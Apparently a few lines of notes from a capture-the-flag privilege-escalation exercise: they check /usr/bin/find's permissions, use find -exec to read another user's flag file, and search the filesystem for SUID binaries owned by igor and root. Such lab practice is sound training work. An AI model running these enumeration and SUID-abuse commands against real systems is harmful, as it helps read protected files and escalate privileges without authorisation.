ls -l /usr/bin/find
find /home/igor/flag1.txt -exec cat {} \;

find / -user igor -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
